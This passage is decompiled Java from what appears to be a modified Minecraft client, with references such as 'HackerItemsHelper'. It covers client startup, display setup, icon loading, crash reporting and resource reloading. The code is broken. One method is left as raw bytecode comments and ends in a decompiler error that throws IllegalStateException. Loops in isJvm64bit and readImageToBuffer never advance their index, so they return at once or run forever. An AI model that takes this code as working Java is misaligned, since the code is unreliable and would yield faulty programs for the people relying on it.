        //  2106: new             Lnet/minecraft/client/audio/SoundHandler;
        //  2109: dup            
        //  2110: aload_0        
        //  2111: getfield        net/minecraft/client/Minecraft.mcResourceManager:Lnet/minecraft/client/resources/IReloadableResourceManager;
        //  2114: aload_0        
        //  2115: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  2118: invokespecial   net/minecraft/client/audio/SoundHandler.<init>:(Lnet/minecraft/client/resources/IResourceManager;Lnet/minecraft/client/settings/GameSettings;)V
        //  2121: putstatic       net/minecraft/client/Minecraft.mcSoundHandler:Lnet/minecraft/client/audio/SoundHandler;
        //  2124: aload_0        
        //  2125: getfield        net/minecraft/client/Minecraft.mcResourceManager:Lnet/minecraft/client/resources/IReloadableResourceManager;
        //  2128: getstatic       net/minecraft/client/Minecraft.mcSoundHandler:Lnet/minecraft/client/audio/SoundHandler;
        //  2131: invokeinterface net/minecraft/client/resources/IReloadableResourceManager.registerReloadListener:(Lnet/minecraft/client/resources/IResourceManagerReloadListener;)V
        //  2136: aload_0        
        //  2137: new             Lnet/minecraft/client/audio/MusicTicker;
        //  2140: dup            
        //  2141: aload_0        
        //  2142: invokespecial   net/minecraft/client/audio/MusicTicker.<init>:(Lnet/minecraft/client/Minecraft;)V
        //  2145: putfield        net/minecraft/client/Minecraft.mcMusicTicker:Lnet/minecraft/client/audio/MusicTicker;
        //  2148: new             Lnet/minecraft/client/gui/FontRenderer;
        //  2151: dup            
        //  2152: aload_0        
        //  2153: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  2156: new             Lnet/minecraft/util/ResourceLocation;
        //  2159: dup            
        //  2160: ldc_w           "textures/font/ascii.png"
        //  2163: invokespecial   net/minecraft/util/ResourceLocation.<init>:(Ljava/lang/String;)V
        //  2166: aload_0        
        //  2167: getfield        net/minecraft/client/Minecraft.renderEngine:Lnet/minecraft/client/renderer/texture/TextureManager;
        //  2170: iconst_0       
        //  2171: invokespecial   net/minecraft/client/gui/FontRenderer.<init>:(Lnet/minecraft/client/settings/GameSettings;Lnet/minecraft/util/ResourceLocation;Lnet/minecraft/client/renderer/texture/TextureManager;Z)V
        //  2174: putstatic       net/minecraft/client/Minecraft.fontRendererObj:Lnet/minecraft/client/gui/FontRenderer;
        //  2177: getstatic       net/minecraft/client/settings/GameSettings.language:Ljava/lang/String;
        //  2180: ifnull          2206
        //  2183: getstatic       net/minecraft/client/Minecraft.fontRendererObj:Lnet/minecraft/client/gui/FontRenderer;
        //  2186: aload_0        
        //  2187: invokevirtual   net/minecraft/client/Minecraft.isUnicode:()Z
        //  2190: invokevirtual   net/minecraft/client/gui/FontRenderer.setUnicodeFlag:(Z)V
        //  2193: getstatic       net/minecraft/client/Minecraft.fontRendererObj:Lnet/minecraft/client/gui/FontRenderer;
        //  2196: aload_0        
        //  2197: getfield        net/minecraft/client/Minecraft.mcLanguageManager:Lnet/minecraft/client/resources/LanguageManager;
        //  2200: invokevirtual   net/minecraft/client/resources/LanguageManager.isCurrentLanguageBidirectional:()Z
        //  2203: invokevirtual   net/minecraft/client/gui/FontRenderer.setBidiFlag:(Z)V
        //  2206: aload_0        
        //  2207: new             Lnet/minecraft/client/gui/FontRenderer;
        //  2210: dup            
        //  2211: aload_0        
        //  2212: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  2215: new             Lnet/minecraft/util/ResourceLocation;
        //  2218: dup            
        //  2219: ldc_w           "textures/font/ascii_sga.png"
        //  2222: invokespecial   net/minecraft/util/ResourceLocation.<init>:(Ljava/lang/String;)V
        //  2225: aload_0        
        //  2226: getfield        net/minecraft/client/Minecraft.renderEngine:Lnet/minecraft/client/renderer/texture/TextureManager;
        //  2229: iconst_0       
        //  2230: invokespecial   net/minecraft/client/gui/FontRenderer.<init>:(Lnet/minecraft/client/settings/GameSettings;Lnet/minecraft/util/ResourceLocation;Lnet/minecraft/client/renderer/texture/TextureManager;Z)V
        //  2233: putfield        net/minecraft/client/Minecraft.standardGalacticFontRenderer:Lnet/minecraft/client/gui/FontRenderer;
        //  2236: aload_0        
        //  2237: getfield        net/minecraft/client/Minecraft.mcResourceManager:Lnet/minecraft/client/resources/IReloadableResourceManager;
        //  2240: getstatic       net/minecraft/client/Minecraft.fontRendererObj:Lnet/minecraft/client/gui/FontRenderer;
        //  2243: invokeinterface net/minecraft/client/resources/IReloadableResourceManager.registerReloadListener:(Lnet/minecraft/client/resources/IResourceManagerReloadListener;)V
        //  2248: aload_0        
        //  2249: getfield        net/minecraft/client/Minecraft.mcResourceManager:Lnet/minecraft/client/resources/IReloadableResourceManager;
        //  2252: aload_0        
        //  2253: getfield        net/minecraft/client/Minecraft.standardGalacticFontRenderer:Lnet/minecraft/client/gui/FontRenderer;
        //  2256: invokeinterface net/minecraft/client/resources/IReloadableResourceManager.registerReloadListener:(Lnet/minecraft/client/resources/IResourceManagerReloadListener;)V
        //  2261: aload_0        
        //  2262: getfield        net/minecraft/client/Minecraft.mcResourceManager:Lnet/minecraft/client/resources/IReloadableResourceManager;
        //  2265: new             Lnet/minecraft/client/resources/GrassColorReloadListener;
        //  2268: dup            
        //  2269: invokespecial   net/minecraft/client/resources/GrassColorReloadListener.<init>:()V
        //  2272: invokeinterface net/minecraft/client/resources/IReloadableResourceManager.registerReloadListener:(Lnet/minecraft/client/resources/IResourceManagerReloadListener;)V
        //  2277: aload_0        
        //  2278: getfield        net/minecraft/client/Minecraft.mcResourceManager:Lnet/minecraft/client/resources/IReloadableResourceManager;
        //  2281: new             Lnet/minecraft/client/resources/FoliageColorReloadListener;
        //  2284: dup            
        //  2285: invokespecial   net/minecraft/client/resources/FoliageColorReloadListener.<init>:()V
        //  2288: invokeinterface net/minecraft/client/resources/IReloadableResourceManager.registerReloadListener:(Lnet/minecraft/client/resources/IResourceManagerReloadListener;)V
        //  2293: getstatic       net/minecraft/stats/AchievementList.openInventory:Lnet/minecraft/stats/Achievement;
        //  2296: new             Lnet/minecraft/client/Minecraft$1;
        //  2299: dup            
        //  2300: aload_0        
        //  2301: invokespecial   net/minecraft/client/Minecraft$1.<init>:(Lnet/minecraft/client/Minecraft;)V
        //  2304: invokevirtual   net/minecraft/stats/Achievement.setStatStringFormatter:(Lnet/minecraft/stats/IStatStringFormat;)Lnet/minecraft/stats/Achievement;
        //  2307: pop            
        //  2308: aload_0        
        //  2309: new             Lnet/minecraft/util/MouseHelper;
        //  2312: dup            
        //  2313: invokespecial   net/minecraft/util/MouseHelper.<init>:()V
        //  2316: putfield        net/minecraft/client/Minecraft.mouseHelper:Lnet/minecraft/util/MouseHelper;
        //  2319: aload_0        
        //  2320: ldc_w           "Pre startup"
        //  2323: invokespecial   net/minecraft/client/Minecraft.checkGLError:(Ljava/lang/String;)V
        //  2326: sipush          7425
        //  2329: invokestatic    net/minecraft/client/renderer/GlStateManager.shadeModel:(I)V
        //  2332: dconst_1       
        //  2333: invokestatic    net/minecraft/client/renderer/GlStateManager.clearDepth:(D)V
        //  2336: sipush          515
        //  2339: invokestatic    net/minecraft/client/renderer/GlStateManager.depthFunc:(I)V
        //  2342: sipush          516
        //  2345: ldc_w           0.1
        //  2348: invokestatic    net/minecraft/client/renderer/GlStateManager.alphaFunc:(IF)V
        //  2351: sipush          1029
        //  2354: invokestatic    net/minecraft/client/renderer/GlStateManager.cullFace:(I)V
        //  2357: sipush          5889
        //  2360: invokestatic    net/minecraft/client/renderer/GlStateManager.matrixMode:(I)V
        //  2363: sipush          5888
        //  2366: invokestatic    net/minecraft/client/renderer/GlStateManager.matrixMode:(I)V
        //  2369: aload_0        
        //  2370: ldc_w           "Startup"
        //  2373: invokespecial   net/minecraft/client/Minecraft.checkGLError:(Ljava/lang/String;)V
        //  2376: aload_0        
        //  2377: new             Lnet/minecraft/client/renderer/texture/TextureMap;
        //  2380: dup            
        //  2381: ldc_w           "textures"
        //  2384: invokespecial   net/minecraft/client/renderer/texture/TextureMap.<init>:(Ljava/lang/String;)V
        //  2387: putfield        net/minecraft/client/Minecraft.textureMapBlocks:Lnet/minecraft/client/renderer/texture/TextureMap;
        //  2390: aload_0        
        //  2391: getfield        net/minecraft/client/Minecraft.textureMapBlocks:Lnet/minecraft/client/renderer/texture/TextureMap;
        //  2394: aload_0        
        //  2395: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  2398: getfield        net/minecraft/client/settings/GameSettings.mipmapLevels:I
        //  2401: invokevirtual   net/minecraft/client/renderer/texture/TextureMap.setMipmapLevels:(I)V
        //  2404: aload_0        
        //  2405: getfield        net/minecraft/client/Minecraft.renderEngine:Lnet/minecraft/client/renderer/texture/TextureManager;
        //  2408: getstatic       net/minecraft/client/renderer/texture/TextureMap.locationBlocksTexture:Lnet/minecraft/util/ResourceLocation;
        //  2411: aload_0        
        //  2412: getfield        net/minecraft/client/Minecraft.textureMapBlocks:Lnet/minecraft/client/renderer/texture/TextureMap;
        //  2415: invokevirtual   net/minecraft/client/renderer/texture/TextureManager.loadTickableTexture:(Lnet/minecraft/util/ResourceLocation;Lnet/minecraft/client/renderer/texture/ITickableTextureObject;)Z
        //  2418: pop            
        //  2419: aload_0        
        //  2420: getfield        net/minecraft/client/Minecraft.renderEngine:Lnet/minecraft/client/renderer/texture/TextureManager;
        //  2423: getstatic       net/minecraft/client/renderer/texture/TextureMap.locationBlocksTexture:Lnet/minecraft/util/ResourceLocation;
        //  2426: invokevirtual   net/minecraft/client/renderer/texture/TextureManager.bindTexture:(Lnet/minecraft/util/ResourceLocation;)V
        //  2429: aload_0        
        //  2430: getfield        net/minecraft/client/Minecraft.textureMapBlocks:Lnet/minecraft/client/renderer/texture/TextureMap;
        //  2433: iconst_0       
        //  2434: aload_0        
        //  2435: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  2438: getfield        net/minecraft/client/settings/GameSettings.mipmapLevels:I
        //  2441: ifle            2448
        //  2444: iconst_1       
        //  2445: goto            2449
        //  2448: iconst_0       
        //  2449: invokevirtual   net/minecraft/client/renderer/texture/TextureMap.func_174937_a:(ZZ)V
        //  2452: aload_0        
        //  2453: new             Lnet/minecraft/client/resources/model/ModelManager;
        //  2456: dup            
        //  2457: aload_0        
        //  2458: getfield        net/minecraft/client/Minecraft.textureMapBlocks:Lnet/minecraft/client/renderer/texture/TextureMap;
        //  2461: invokespecial   net/minecraft/client/resources/model/ModelManager.<init>:(Lnet/minecraft/client/renderer/texture/TextureMap;)V
        //  2464: putfield        net/minecraft/client/Minecraft.modelManager:Lnet/minecraft/client/resources/model/ModelManager;
        //  2467: aload_0        
        //  2468: getfield        net/minecraft/client/Minecraft.mcResourceManager:Lnet/minecraft/client/resources/IReloadableResourceManager;
        //  2471: aload_0        
        //  2472: getfield        net/minecraft/client/Minecraft.modelManager:Lnet/minecraft/client/resources/model/ModelManager;
        //  2475: invokeinterface net/minecraft/client/resources/IReloadableResourceManager.registerReloadListener:(Lnet/minecraft/client/resources/IResourceManagerReloadListener;)V
        //  2480: aload_0        
        //  2481: new             Lnet/minecraft/client/renderer/entity/RenderItem;
        //  2484: dup            
        //  2485: aload_0        
        //  2486: getfield        net/minecraft/client/Minecraft.renderEngine:Lnet/minecraft/client/renderer/texture/TextureManager;
        //  2489: aload_0        
        //  2490: getfield        net/minecraft/client/Minecraft.modelManager:Lnet/minecraft/client/resources/model/ModelManager;
        //  2493: invokespecial   net/minecraft/client/renderer/entity/RenderItem.<init>:(Lnet/minecraft/client/renderer/texture/TextureManager;Lnet/minecraft/client/resources/model/ModelManager;)V
        //  2496: putfield        net/minecraft/client/Minecraft.renderItem:Lnet/minecraft/client/renderer/entity/RenderItem;
        //  2499: aload_0        
        //  2500: new             Lnet/minecraft/client/renderer/entity/RenderManager;
        //  2503: dup            
        //  2504: aload_0        
        //  2505: getfield        net/minecraft/client/Minecraft.renderEngine:Lnet/minecraft/client/renderer/texture/TextureManager;
        //  2508: aload_0        
        //  2509: getfield        net/minecraft/client/Minecraft.renderItem:Lnet/minecraft/client/renderer/entity/RenderItem;
        //  2512: invokespecial   net/minecraft/client/renderer/entity/RenderManager.<init>:(Lnet/minecraft/client/renderer/texture/TextureManager;Lnet/minecraft/client/renderer/entity/RenderItem;)V
        //  2515: putfield        net/minecraft/client/Minecraft.renderManager:Lnet/minecraft/client/renderer/entity/RenderManager;
        //  2518: aload_0        
        //  2519: new             Lnet/minecraft/client/renderer/ItemRenderer;
        //  2522: dup            
        //  2523: aload_0        
        //  2524: invokespecial   net/minecraft/client/renderer/ItemRenderer.<init>:(Lnet/minecraft/client/Minecraft;)V
        //  2527: putfield        net/minecraft/client/Minecraft.itemRenderer:Lnet/minecraft/client/renderer/ItemRenderer;
        //  2530: aload_0        
        //  2531: getfield        net/minecraft/client/Minecraft.mcResourceManager:Lnet/minecraft/client/resources/IReloadableResourceManager;
        //  2534: aload_0        
        //  2535: getfield        net/minecraft/client/Minecraft.renderItem:Lnet/minecraft/client/renderer/entity/RenderItem;
        //  2538: invokeinterface net/minecraft/client/resources/IReloadableResourceManager.registerReloadListener:(Lnet/minecraft/client/resources/IResourceManagerReloadListener;)V
        //  2543: aload_0        
        //  2544: new             Lnet/minecraft/client/renderer/EntityRenderer;
        //  2547: dup            
        //  2548: aload_0        
        //  2549: aload_0        
        //  2550: getfield        net/minecraft/client/Minecraft.mcResourceManager:Lnet/minecraft/client/resources/IReloadableResourceManager;
        //  2553: invokespecial   net/minecraft/client/renderer/EntityRenderer.<init>:(Lnet/minecraft/client/Minecraft;Lnet/minecraft/client/resources/IResourceManager;)V
        //  2556: putfield        net/minecraft/client/Minecraft.entityRenderer:Lnet/minecraft/client/renderer/EntityRenderer;
        //  2559: aload_0        
        //  2560: getfield        net/minecraft/client/Minecraft.mcResourceManager:Lnet/minecraft/client/resources/IReloadableResourceManager;
        //  2563: aload_0        
        //  2564: getfield        net/minecraft/client/Minecraft.entityRenderer:Lnet/minecraft/client/renderer/EntityRenderer;
        //  2567: invokeinterface net/minecraft/client/resources/IReloadableResourceManager.registerReloadListener:(Lnet/minecraft/client/resources/IResourceManagerReloadListener;)V
        //  2572: aload_0        
        //  2573: new             Lnet/minecraft/client/renderer/BlockRendererDispatcher;
        //  2576: dup            
        //  2577: aload_0        
        //  2578: getfield        net/minecraft/client/Minecraft.modelManager:Lnet/minecraft/client/resources/model/ModelManager;
        //  2581: invokevirtual   net/minecraft/client/resources/model/ModelManager.getBlockModelShapes:()Lnet/minecraft/client/renderer/BlockModelShapes;
        //  2584: aload_0        
        //  2585: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  2588: invokespecial   net/minecraft/client/renderer/BlockRendererDispatcher.<init>:(Lnet/minecraft/client/renderer/BlockModelShapes;Lnet/minecraft/client/settings/GameSettings;)V
        //  2591: putfield        net/minecraft/client/Minecraft.field_175618_aM:Lnet/minecraft/client/renderer/BlockRendererDispatcher;
        //  2594: aload_0        
        //  2595: getfield        net/minecraft/client/Minecraft.mcResourceManager:Lnet/minecraft/client/resources/IReloadableResourceManager;
        //  2598: aload_0        
        //  2599: getfield        net/minecraft/client/Minecraft.field_175618_aM:Lnet/minecraft/client/renderer/BlockRendererDispatcher;
        //  2602: invokeinterface net/minecraft/client/resources/IReloadableResourceManager.registerReloadListener:(Lnet/minecraft/client/resources/IResourceManagerReloadListener;)V
        //  2607: aload_0        
        //  2608: new             Lnet/minecraft/client/renderer/RenderGlobal;
        //  2611: dup            
        //  2612: aload_0        
        //  2613: invokespecial   net/minecraft/client/renderer/RenderGlobal.<init>:(Lnet/minecraft/client/Minecraft;)V
        //  2616: putfield        net/minecraft/client/Minecraft.renderGlobal:Lnet/minecraft/client/renderer/RenderGlobal;
        //  2619: aload_0        
        //  2620: getfield        net/minecraft/client/Minecraft.mcResourceManager:Lnet/minecraft/client/resources/IReloadableResourceManager;
        //  2623: aload_0        
        //  2624: getfield        net/minecraft/client/Minecraft.renderGlobal:Lnet/minecraft/client/renderer/RenderGlobal;
        //  2627: invokeinterface net/minecraft/client/resources/IReloadableResourceManager.registerReloadListener:(Lnet/minecraft/client/resources/IResourceManagerReloadListener;)V
        //  2632: aload_0        
        //  2633: new             Lnet/minecraft/client/gui/achievement/GuiAchievement;
        //  2636: dup            
        //  2637: aload_0        
        //  2638: invokespecial   net/minecraft/client/gui/achievement/GuiAchievement.<init>:(Lnet/minecraft/client/Minecraft;)V
        //  2641: putfield        net/minecraft/client/Minecraft.guiAchievement:Lnet/minecraft/client/gui/achievement/GuiAchievement;
        //  2644: iconst_0       
        //  2645: iconst_0       
        //  2646: aload_0        
        //  2647: getfield        net/minecraft/client/Minecraft.displayWidth:I
        //  2650: aload_0        
        //  2651: getfield        net/minecraft/client/Minecraft.displayHeight:I
        //  2654: invokestatic    net/minecraft/client/renderer/GlStateManager.viewport:(IIII)V
        //  2657: aload_0        
        //  2658: new             Lnet/minecraft/client/particle/EffectRenderer;
        //  2661: dup            
        //  2662: getstatic       net/minecraft/client/Minecraft.theWorld:Lnet/minecraft/client/multiplayer/WorldClient;
        //  2665: aload_0        
        //  2666: getfield        net/minecraft/client/Minecraft.renderEngine:Lnet/minecraft/client/renderer/texture/TextureManager;
        //  2669: invokespecial   net/minecraft/client/particle/EffectRenderer.<init>:(Lnet/minecraft/world/World;Lnet/minecraft/client/renderer/texture/TextureManager;)V
        //  2672: putfield        net/minecraft/client/Minecraft.effectRenderer:Lnet/minecraft/client/particle/EffectRenderer;
        //  2675: aload_0        
        //  2676: ldc_w           "Post startup"
        //  2679: invokespecial   net/minecraft/client/Minecraft.checkGLError:(Ljava/lang/String;)V
        //  2682: new             Lnet/minecraft/client/gui/GuiIngame;
        //  2685: dup            
        //  2686: aload_0        
        //  2687: invokespecial   net/minecraft/client/gui/GuiIngame.<init>:(Lnet/minecraft/client/Minecraft;)V
        //  2690: putstatic       net/minecraft/client/Minecraft.ingameGUI:Lnet/minecraft/client/gui/GuiIngame;
        //  2693: aload_0        
        //  2694: getfield        net/minecraft/client/Minecraft.serverName:Ljava/lang/String;
        //  2697: ifnull          2730
        //  2700: aload_0        
        //  2701: new             Lnet/minecraft/client/multiplayer/GuiConnecting;
        //  2704: dup            
        //  2705: new             Lnet/minecraft/client/gui/GuiMainMenu;
        //  2708: dup            
        //  2709: invokespecial   net/minecraft/client/gui/GuiMainMenu.<init>:()V
        //  2712: aload_0        
        //  2713: aload_0        
        //  2714: getfield        net/minecraft/client/Minecraft.serverName:Ljava/lang/String;
        //  2717: aload_0        
        //  2718: getfield        net/minecraft/client/Minecraft.serverPort:I
        //  2721: invokespecial   net/minecraft/client/multiplayer/GuiConnecting.<init>:(Lnet/minecraft/client/gui/GuiScreen;Lnet/minecraft/client/Minecraft;Ljava/lang/String;I)V
        //  2724: invokevirtual   net/minecraft/client/Minecraft.displayGuiScreen:(Lnet/minecraft/client/gui/GuiScreen;)V
        //  2727: goto            2761
        //  2730: getstatic       Mood/HackerItemsHelper.Udvozles:Z
        //  2733: ifeq            2750
        //  2736: aload_0        
        //  2737: new             LDTool/gui/Udvozlunk;
        //  2740: dup            
        //  2741: invokespecial   DTool/gui/Udvozlunk.<init>:()V
        //  2744: invokevirtual   net/minecraft/client/Minecraft.displayGuiScreen:(Lnet/minecraft/client/gui/GuiScreen;)V
        //  2747: goto            2761
        //  2750: aload_0        
        //  2751: new             Lnet/minecraft/client/gui/GuiMainMenu;
        //  2754: dup            
        //  2755: invokespecial   net/minecraft/client/gui/GuiMainMenu.<init>:()V
        //  2758: invokevirtual   net/minecraft/client/Minecraft.displayGuiScreen:(Lnet/minecraft/client/gui/GuiScreen;)V
        //  2761: aload_0        
        //  2762: getfield        net/minecraft/client/Minecraft.renderEngine:Lnet/minecraft/client/renderer/texture/TextureManager;
        //  2765: aload_0        
        //  2766: getfield        net/minecraft/client/Minecraft.mojangLogo:Lnet/minecraft/util/ResourceLocation;
        //  2769: invokevirtual   net/minecraft/client/renderer/texture/TextureManager.deleteTexture:(Lnet/minecraft/util/ResourceLocation;)V
        //  2772: aload_0        
        //  2773: aconst_null    
        //  2774: putfield        net/minecraft/client/Minecraft.mojangLogo:Lnet/minecraft/util/ResourceLocation;
        //  2777: aload_0        
        //  2778: new             Lnet/minecraft/client/LoadingScreenRenderer;
        //  2781: dup            
        //  2782: aload_0        
        //  2783: invokespecial   net/minecraft/client/LoadingScreenRenderer.<init>:(Lnet/minecraft/client/Minecraft;)V
        //  2786: putfield        net/minecraft/client/Minecraft.loadingScreen:Lnet/minecraft/client/LoadingScreenRenderer;
        //  2789: aload_0        
        //  2790: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  2793: getfield        net/minecraft/client/settings/GameSettings.fullScreen:Z
        //  2796: ifeq            2810
        //  2799: aload_0        
        //  2800: getfield        net/minecraft/client/Minecraft.fullscreen:Z
        //  2803: ifne            2810
        //  2806: aload_0        
        //  2807: invokevirtual   net/minecraft/client/Minecraft.toggleFullscreen:()V
        //  2810: aload_0        
        //  2811: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  2814: getfield        net/minecraft/client/settings/GameSettings.enableVsync:Z
        //  2817: invokestatic    org/lwjgl/opengl/Display.setVSyncEnabled:(Z)V
        //  2820: goto            2840
        //  2823: astore          7
        //  2825: aload_0        
        //  2826: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  2829: iconst_0       
        //  2830: putfield        net/minecraft/client/settings/GameSettings.enableVsync:Z
        //  2833: aload_0        
        //  2834: getfield        net/minecraft/client/Minecraft.gameSettings:Lnet/minecraft/client/settings/GameSettings;
        //  2837: invokevirtual   net/minecraft/client/settings/GameSettings.saveOptions:()V
        //  2840: aload_0        
        //  2841: getfield        net/minecraft/client/Minecraft.renderGlobal:Lnet/minecraft/client/renderer/RenderGlobal;
        //  2844: invokevirtual   net/minecraft/client/renderer/RenderGlobal.func_174966_b:()V
        //  2847: return         
        //    Exceptions:
        //  throws org.lwjgl.LWJGLException
        // 
        // The error that occurred was:
        // 
        // java.lang.NullPointerException
        // 
        throw new IllegalStateException("An error occurred while decompiling this method.");
    }
    
    private void func_175608_ak() {
        this.metadataSerializer_.registerMetadataSectionType(new TextureMetadataSectionSerializer(), TextureMetadataSection.class);
        this.metadataSerializer_.registerMetadataSectionType(new FontMetadataSectionSerializer(), FontMetadataSection.class);
        this.metadataSerializer_.registerMetadataSectionType(new AnimationMetadataSectionSerializer(), AnimationMetadataSection.class);
        this.metadataSerializer_.registerMetadataSectionType(new PackMetadataSectionSerializer(), PackMetadataSection.class);
        this.metadataSerializer_.registerMetadataSectionType(new LanguageMetadataSectionSerializer(), LanguageMetadataSection.class);
    }
    
    private void func_175595_al() {
        this.stream = new TwitchStream(this, (Property)Iterables.getFirst(this.twitchDetails.get("twitch_access_token"), null));
    }
    
    private void func_175609_am() throws LWJGLException {
        Display.setResizable(true);
        Display.setTitle(String.valueOf(String.valueOf(Client.name)) + " Loading...");
        Display.create(new PixelFormat().withDepthBits(24));
    }
    
    private void func_175605_an() throws LWJGLException {
        if (this.fullscreen) {
            Display.setFullscreen(true);
            final DisplayMode displayMode = Display.getDisplayMode();
            this.displayWidth = Math.max(1, displayMode.getWidth());
            this.displayHeight = Math.max(1, displayMode.getHeight());
        }
        else {
            Display.setDisplayMode(new DisplayMode(this.displayWidth, this.displayHeight));
        }
    }
    
    private void func_175594_ao() {
        if (Util.getOSType() != Util.EnumOS.OSX) {
            final InputStream func_152780_c = this.mcDefaultResourcePack.func_152780_c(new ResourceLocation("icons/icon_16x16.png"));
            final InputStream func_152780_c2 = this.mcDefaultResourcePack.func_152780_c(new ResourceLocation("icons/icon_32x32.png"));
            if (func_152780_c != null && func_152780_c2 != null) {
                Display.setIcon(new ByteBuffer[] { this.readImageToBuffer(func_152780_c), this.readImageToBuffer(func_152780_c2) });
            }
            IOUtils.closeQuietly(func_152780_c);
            IOUtils.closeQuietly(func_152780_c2);
        }
    }
    
    private static boolean isJvm64bit() {
        String[] array;
        while (0 < (array = new String[] { "sun.arch.data.model", "com.ibm.vm.bitmode", "os.arch" }).length) {
            final String property = System.getProperty(array[0]);
            if (property != null && property.contains("64")) {
                return true;
            }
            int n = 0;
            ++n;
        }
        return false;
    }
    
    public Framebuffer getFramebuffer() {
        return this.framebufferMc;
    }
    
    public String func_175600_c() {
        return this.launchedVersion;
    }
    
    private void startTimerHackThread() {
        final Thread thread = new Thread("Timer hack thread") {
            private static final String __OBFID;
            final Minecraft this$0;
            
            @Override
            public void run() {
                while (this.this$0.running) {
                    Thread.sleep(2147483647L);
                }
            }
            
            static {
                __OBFID = "CL_00000639";
            }
        };
        thread.setDaemon(true);
        thread.start();
    }
    
    public void crashed(final CrashReport crashReporter) {
        this.hasCrashed = true;
        this.crashReporter = crashReporter;
    }
    
    public void displayCrashReport(final CrashReport crashReport) {
        getMinecraft();
        final File file = new File(new File(Minecraft.mcDataDir, "crash-reports"), "crash-" + new SimpleDateFormat("yyyy-MM-dd_HH.mm.ss").format(new Date()) + "-client.txt");
        Bootstrap.func_179870_a(crashReport.getCompleteReport());
        if (crashReport.getFile() != null) {
            Bootstrap.func_179870_a("#@!@# Game crashed! Crash report saved to: #@!@# " + crashReport.getFile());
            System.exit(-1);
        }
        else if (crashReport.saveToFile(file)) {
            Bootstrap.func_179870_a("#@!@# Game crashed! Crash report saved to: #@!@# " + file.getAbsolutePath());
            System.exit(-1);
        }
        else {
            Bootstrap.func_179870_a("#@?@# Game crashed! Crash report could not be saved. #@?@#");
            System.exit(-2);
        }
    }
    
    public boolean isUnicode() {
        return this.mcLanguageManager.isCurrentLocaleUnicode() || this.gameSettings.forceUnicodeFont;
    }
    
    public void refreshResources() {
        final ArrayList arrayList = Lists.newArrayList(this.defaultResourcePacks);
        final Iterator<ResourcePackRepository.Entry> iterator = this.mcResourcePackRepository.getRepositoryEntries().iterator();
        while (iterator.hasNext()) {
            arrayList.add(iterator.next().getResourcePack());
        }
        if (this.mcResourcePackRepository.getResourcePackInstance() != null) {
            arrayList.add(this.mcResourcePackRepository.getResourcePackInstance());
        }
        this.mcResourceManager.reloadResources(arrayList);
        this.mcLanguageManager.parseLanguageMetadata(arrayList);
        if (this.renderGlobal != null) {
            this.renderGlobal.loadRenderers();
        }
    }
    
    private ByteBuffer readImageToBuffer(final InputStream inputStream) throws IOException {
        final BufferedImage read = ImageIO.read(inputStream);
        final int[] rgb = read.getRGB(0, 0, read.getWidth(), read.getHeight(), null, 0, read.getWidth());
        final ByteBuffer allocate = ByteBuffer.allocate(4 * rgb.length);
        final int[] array = rgb;
        while (0 < rgb.length) {
            final int n = array[0];
            allocate.putInt(n << 8 | (n >> 24 & 0xFF));
            int n2 = 0;
            ++n2;
        }
        allocate.flip();
        return allocate;
    }
    
    private void updateDisplayMode() throws LWJGLException {
        final HashSet hashSet = Sets.newHashSet();
        Collections.addAll(hashSet, Display.getAvailableDisplayModes());
        DisplayMode desktopDisplayMode = Display.getDesktopDisplayMode();
        if (!hashSet.contains(desktopDisplayMode) && Util.getOSType() == Util.EnumOS.OSX) {
            for (final DisplayMode displayMode : Minecraft.macDisplayModes) {
                for (final DisplayMode displayMode2 : hashSet) {
                    if (displayMode2.getBitsPerPixel() == 32 && displayMode2.getWidth() == displayMode.getWidth() && displayMode2.getHeight() == displayMode.getHeight()) {
                        break;
                    }
                }
                if (!false) {
                    for (final DisplayMode displayMode3 : hashSet) {
                        if (displayMode3.getBitsPerPixel() == 32 && displayMode3.getWidth() == displayMode.getWidth() / 2 && displayMode3.getHeight() == displayMode.getHeight() / 2) {
                            desktopDisplayMode = displayMode3;
                            break;
                        }
                    }
                }
            }
        }
        Display.setDisplayMode(desktopDisplayMode);
        this.displayWidth = desktopDisplayMode.getWidth();
        this.displayHeight = desktopDisplayMode.getHeight();
    }
    
    private void func_180510_a(final TextureManager textureManager) {
        final int scaleFactor = new ScaledResolution(this, this.displayWidth, this.displayHeight).getScaleFactor();
        final Framebuffer framebuffer = new Framebuffer(ScaledResolution.getScaledWidth() * scaleFactor, ScaledResolution.getScaledHeight() * scaleFactor, true);
        framebuffer.bindFramebuffer(false);
        GlStateManager.matrixMode(5889);
        GlStateManager.ortho(0.0, ScaledResolution.getScaledWidth(), ScaledResolution.getScaledHeight(), 0.0, 1000.0, 3000.0);
        GlStateManager.matrixMode(5888);
        GlStateManager.translate(0.0f, 0.0f, -2000.0f);
        final InputStream inputStream = this.mcDefaultResourcePack.getInputStream(Minecraft.locationMojangPng);
        textureManager.bindTexture(this.mojangLogo = textureManager.getDynamicTextureLocation("logo", new DynamicTexture(ImageIO.read(inputStream))));
        IOUtils.closeQuietly(inputStream);
        final Tessellator instance = Tessellator.getInstance();
        final WorldRenderer worldRenderer = instance.getWorldRenderer();
        worldRenderer.startDrawingQuads();
        worldRenderer.func_178991_c(16777215);
        worldRenderer.addVertexWithUV(0.0, this.displayHeight, 0.0, 0.0, 0.0);
        worldRenderer.addVertexWithUV(this.displayWidth, this.displayHeight, 0.0, 0.0, 0.0);
        worldRenderer.addVertexWithUV(this.displayWidth, 0.0, 0.0, 0.0, 0.0);
        worldRenderer.addVertexWithUV(0.0, 0.0, 0.0, 0.0, 0.0);
        instance.draw();
        GlStateManager.color(1.0f, 1.0f, 1.0f, 1.0f);
        worldRenderer.func_178991_c(16777215);
        this.scaledTessellator((ScaledResolution.getScaledWidth() - 256) / 2, (ScaledResolution.getScaledHeight() - 256) / 2, 0, 0, 256, 256);
        framebuffer.unbindFramebuffer();
